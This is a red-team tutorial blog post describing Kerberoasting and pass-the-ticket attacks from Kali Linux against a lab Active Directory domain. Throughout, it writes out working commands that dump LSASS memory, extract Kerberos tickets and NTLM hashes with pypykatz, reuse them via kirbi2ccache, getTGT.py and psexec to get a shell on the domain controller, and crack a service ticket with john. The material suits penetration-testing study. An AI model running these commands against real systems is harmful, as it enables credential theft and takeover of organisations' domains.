<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Kerberoasting and Pass the Ticket Attack Using Linux</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/kerberoasting-and-pass-the-ticket-attack-using-linux/" rel="bookmark"><time class="entry-date published" datetime="2020-06-14T18:22:24+00:00">June 14, 2020</time><time class="updated" datetime="2025-05-31T19:14:47+00:00">May 31, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In our previous post, we explained the Kerberoasting attack in detail, which you can read from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/">here</a></strong></span>. I recommend, then, to revisit our previous article for better understanding before implementing the attack mentioned in this section.</span></p>
<p class="ai-optimize-7"><span style="color: #000000;">In this post, we will discuss how to perform a kerberoasting attack and remotely pass the Kerberos ticket using Kali Linux. Kerberoasting is considered to be lateral movement, so once you have penetrated the domain client system and obtained the computer shell, then use the following method for abusing Kerberos.</span></p>
<h3 class="ai-optimize-8"><span style="color: #000000;"><span style="color: #800000;">Table of Content</span> </span></h3>
<p class="ai-optimize-9"><span style="color: #000000;"><strong>Pass the ticket</strong></span></p>
<ul>
<li class="ai-optimize-10"><span style="color: #000000;">kirbi2ccache</span></li>
<li class="ai-optimize-11"><span style="color: #000000;">Impacket gettgt.py</span></li>
</ul>
<p class="ai-optimize-12"><span style="color: #000000;"><strong>Kerberoasting</strong></span></p>
<ul>
<li class="ai-optimize-13"><span style="color: #000000;">Kirbi2john</span></li>
</ul>
<h3 class="ai-optimize-14"><span style="color: #800000;">Pass the Ticket: kirbi2ccache</span></h3>
<p class="ai-optimize-15"><span style="color: #000000;">In order to abuse Kerberos against pass the ticket or kerberoasting attack, we need to import DMP file in our local machine (Kali Linux) through Client machine and to do this execute the following command through meterpreter session.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">load powershell
powershell_shell
Get-Process Lsass
cd C:\Windows\System32
.\rundll32.exe comsvcs.dll, MiniDump 628 C:\lsass.DMP full</pre>
<h5 class="ai-optimize-16"><strong><span style="color: #000000;">Why we need Lsass.DMP file?</span></strong></h5>
<p class="ai-optimize-17"><span style="color: #000000;">Because of LSASS.DMP stores the TGT &amp; TGS ticket in the kirbi format for some period of time and using this DMP file we can obtain the following:</span></p>
<ul>
<li class="ai-optimize-18"><span style="color: #000000;">NTLM HASH of User</span></li>
<li class="ai-optimize-19"><span style="color: #000000;">KRB5_TGT ticket</span></li>
<li class="ai-optimize-20"><span style="color: #000000;">KRB5_TGS ticket</span></li>
<li class="ai-optimize-21"><span style="color: #000000;">NTLM HASH for Service</span></li>
</ul>
<p class="ai-optimize-22"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sJdWaLAckc4/XuZopxcBaxI/AAAAAAAAkzA/8y0v3z5pbbIrwlj0Apv91PDUDoQtmRp9QCLcBGAsYHQ/s1600/1.png"/></span></p>
<p class="ai-optimize-23"><span style="color: #000000;">Once you have dumped the lsass.dmp, download it on your local machine for extracting kirbi files.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">download lsass.DMP /root/Desktop/</pre>
<p class="ai-optimize-24"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9BGi2Lpomb0/XuZoqLcOQYI/AAAAAAAAkzI/_Mq4jFL8Lgsv2-30dm0rSeNSGRK6KRG2ACLcBGAsYHQ/s1600/2.png"/></span></p>
<p class="ai-optimize-25"><span style="color: #000000;">Download and install <a style="color: #000000;" href="https://github.com/skelsec/pypykatz">pypykatz</a> for extracting stored Kerberos tickets in Kirbi format from inside the lsass.DMP file by executing the following commands</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkdir /root/kerb
pypykatz lsa -k /root/kerb minidump /root/Desktop/lsass.DMP</pre>
<p class="ai-optimize-26"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_DSP-41z5HE/XuZoqHWgDQI/AAAAAAAAkzE/x5y7wXaVWUsiHEb-awIH_tZW8tDK9SqyQCLcBGAsYHQ/s1600/3.png"/></span></p>
<p class="ai-optimize-27"><span style="color: #000000;">As you can observe we have obtained all Kerberos ticket in kirbi format as well as the NTLM HASH for user Yashika. </span></p>
<p class="ai-optimize-28"><span style="color: #000000;">Currently, we have enumerated the KRB5_TGT ticket authorized for user “Yashika”. Let try to pass the ticket to get TGS and access the requested services.</span></p>
<p class="ai-optimize-29"><span style="color: #000000;"><strong>Kirbi2ccache </strong>is a python script that falls under the<strong> Impacket</strong> library, transforming the kirbi format file into ccache and then using Export KRB5CCCNAME to inject the ccache file into DC to get access to the requesting service.</span></p>
<p class="ai-optimize-30"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JZleLv6Vs0M/XuZoqlp2weI/AAAAAAAAkzM/AA7kjqtTFPoMTMKUoAlzMxaBLi9SQ0uogCLcBGAsYHQ/s1600/4.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">kirbi2ccache TGT_IGNITE.LOCAL_yashika_krbtgt_IGNITE.LOCAL_6d469878.kirbi yashika.ccache
export KRB5CCNAME=yashika.ccache; psexec.py -dc-ip 192.168.1.105 -target-ip 192.168.1.105 -no-pass -k ignite.local/yashika@WIN-S0V7KMTVLD2.ignite.local</pre>
<p class="ai-optimize-31"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WLeseAoe2QE/XuZorXYfZvI/AAAAAAAAkzQ/EZoyS7VUykIFnFbX9xwia1_aCZfxClptQCLcBGAsYHQ/s1600/5.png"/></span></p>
<h3 class="ai-optimize-32"><span style="color: #800000;">Impacket GetTGT.py</span></h3>
<p class="ai-optimize-33"><span style="color: #000000;">Likewise, this can also be accomplished with the help of getTGT.py, as it will request a TGT and save it as ccache by giving a password, hash or aesKey.</span></p>
<p class="ai-optimize-34"><span style="color: #000000;">If you recall that for user Yashika we have extracted the NTLM HASH. Now we have used the following command to request a TGT from DC and save it in CCache format. Laterally we can inject the ccache file into DC with the help of Export KRB5CCNAME to get access to the requesting service.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python getTGT.py -dc-ip 192.168.1.105 -hashes :64fbae31cc352fc26af97cbdef151e03 ignite.local/yashika
export KRB5CCNAME=yashika.ccache; psexec.py -dc-ip 192.168.1.105 -target-ip 192.168.1.105 -no-pass -k ignite.local/yashika@WIN-S0V7KMTVLD2.ignite.local</pre>
<p class="ai-optimize-35"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5UGRBEgWlbw/XuZosCX_krI/AAAAAAAAkzU/nBdmbn58Vyk8uX51JUwEA3GHAKt0elQugCLcBGAsYHQ/s1600/6.png"/></span></p>
<h3 class="ai-optimize-36"><span style="color: #800000;">Kerberosasting: kirbi2john</span></h3>
<p class="ai-optimize-37"><span style="color: #000000;">As we said with the help of stored KRB5_TGS, we can extract the NTLM hashes for Service Server and try to crack the hash in order to get the password in clear text or use this hash to pass the hash attack. This would be known as kerberoasting.</span></p>
<p class="ai-optimize-38"><span style="color: #000000;">Now as you can see in the highlight image we’ve outlined the KRB5_TGS for SQL Server in kirbi format and converted it to john crackable format with the help of <strong>kirbi2john.py</strong> (possible at /usr/ share/john/) called “TGS hash;” then use john for brute force password.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">/usr/share/john/kirbi2john.py &lt;KRB5_TGS kirbi&gt;  &gt; &lt;Output file name&gt;
john --wordlist=/usr/share/wordlists/rockyou.txt TGS_hash</pre>
<p class="ai-optimize-39"><span style="color: #000000;">Booom!!!! We found the password for SQL service server.</span></p>
<p class="ai-optimize-40"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Qe155aJZd5c/XuZosodR3SI/AAAAAAAAkzY/q5c6EpPqZmYUnhMhBjDjCWBriSmqxmp1wCLcBGAsYHQ/s1600/7.png"/></span></p>
<p class="ai-optimize-6"><span style="color: #000000;">To learn more about Penetration Testing. Follow this</span> <a href="https://www.hackingarticles.in/category/penetration-testing/">Link.</a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
